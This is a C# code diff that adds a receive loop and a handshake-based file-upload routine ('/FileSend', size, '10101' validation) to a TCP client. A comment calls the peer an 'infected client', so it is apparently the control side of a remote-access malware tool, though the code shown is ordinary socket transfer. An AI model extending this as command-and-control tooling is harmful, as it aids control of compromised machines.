@@ -39,32 +39,36 @@ namespace Client
 
             public void Receiver()
             {
-                NetworkStream clientStream = client.GetStream(); 
-                byte[] _receivdata = new byte[4096];
-                ASCIIEncoding encoder = new ASCIIEncoding();
-                int bytesRead = 0;
-                ///////////////////////////////////
-                ///////Wait return from Client:AkA.infected client
-                try
+                while (true)
                 {
-                    //blocks until a client sends a message
-                    bytesRead = clientStream.Read(_receivdata, 0, 4096);
-                }
-                catch
-                {
-                    //a socket error has occured
-                    Console.WriteLine("Socket Error");
-                }
+                    NetworkStream clientStream = client.GetStream();
+                    byte[] _receivdata = new byte[4096];
+                    ASCIIEncoding encoder = new ASCIIEncoding();
+                    int bytesRead = 0;
+                    ///////////////////////////////////
+                    ///////Wait return from Client:AkA.infected client
+                    try
+                    {
+                        //blocks until a client sends a message
+                        bytesRead = clientStream.Read(_receivdata, 0, 4096);
+                    }
+                    catch
+                    {
+                        //a socket error has occured
+                        Console.WriteLine("Socket Error");
+                    }
 
-                if (bytesRead == 0)
-                {
-                    //the client has disconnected from the server
-                    Console.WriteLine("Client Disconnected ...");
-                }
+                    if (bytesRead == 0)
+                    {
+                        //the client has disconnected from the server
+                        Console.WriteLine("Client Disconnected ...");
+                    }
 
-                //message has successfully been received
-                string ReceivData = encoder.GetString(_receivdata, 0, bytesRead);
-                Console.WriteLine("Client : " + ReceivData);       
+                    //message has successfully been received
+                    string ReceivData = encoder.GetString(_receivdata, 0, bytesRead);
+                    Console.WriteLine("Client : " + ReceivData);
+                }
+ 
             }
 
             public static void MsgStart()
@@ -110,34 +114,47 @@ namespace Client
 
             public static void FileSending(string file_path)
             {
-                NetworkStream clientStream = client.GetStream(); 
-                  try
-                    {
-                         /* File reading operation. */
-                        byte[] fileNameByte = Encoding.ASCII.GetBytes(file_path);
-                         Console.WriteLine("Buffering ...");
-                         byte[] fileData = File.ReadAllBytes(file_path); 
-                         /* Read & store file byte data in byte array. */
-                         byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
-                         /* clientData will store complete bytes which will store file name length, file name & file data. */
-                         byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);
-                         /* File name length’s binary data. */
-                         fileNameLen.CopyTo(clientData, 0);
-                         fileNameByte.CopyTo(clientData, 4);
-                         fileData.CopyTo(clientData, 4 + fileNameByte.Length);
-                         /* copy these bytes to a variable with format line [file name length] [file name] [ file content] */
+                NetworkStream clientStream = client.GetStream();
+                ASCIIEncoding encoder = new ASCIIEncoding();
+                byte[] KeysByte;
 
-                         /* Trying to connection with server. */
-                         Console.WriteLine("File sending...");
-                         clientStream.Write(clientData, 0, clientData.Length);
-                         clientStream.Flush();
-                         /* Data send complete now close socket. */
-                         Console.WriteLine("File transferred.");
+                KeysByte = encoder.GetBytes("/FileSend");
+                clientStream.Write(KeysByte, 0, KeysByte.Length);
+                Thread.Sleep(250);
+                try
+                    {
+                        /* File reading operation. */
+                        Console.WriteLine("Buffering ...");
+                        /* Read & store file byte data in byte array. */
+                        byte[] fileData = File.ReadAllBytes(file_path);
+
+                        //Send Size of the file                      
+                        byte[] buffer = encoder.GetBytes(Convert.ToString(fileData.Length));
+                        clientStream.Write(buffer, 0, buffer.Length);
+                        clientStream.Flush();
+                        //Waiting for validation
+                        int bytesRead = 0;
+                        byte[] _receivdata = new byte[4096];
+                        bytesRead = clientStream.Read(_receivdata, 0, 4096);
+                        string ReceivData = encoder.GetString(_receivdata, 0, bytesRead);
+                        if (ReceivData == "10101")
+                        {
+                            //Sending
+                            Console.Write(" File sending ...");
+                            clientStream.Write(fileData, 0, fileData.Length);
+                            clientStream.Flush();
+                        }
+                        else
+                        {
+                            Console.WriteLine("Eror : Wrog Validation");
+                        }
+                
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine("SomeThing Went Wrong");
-                    } 
+                        Console.WriteLine(ex.Message);
+                    }
+                Console.Write(" Done");
             }
             
 
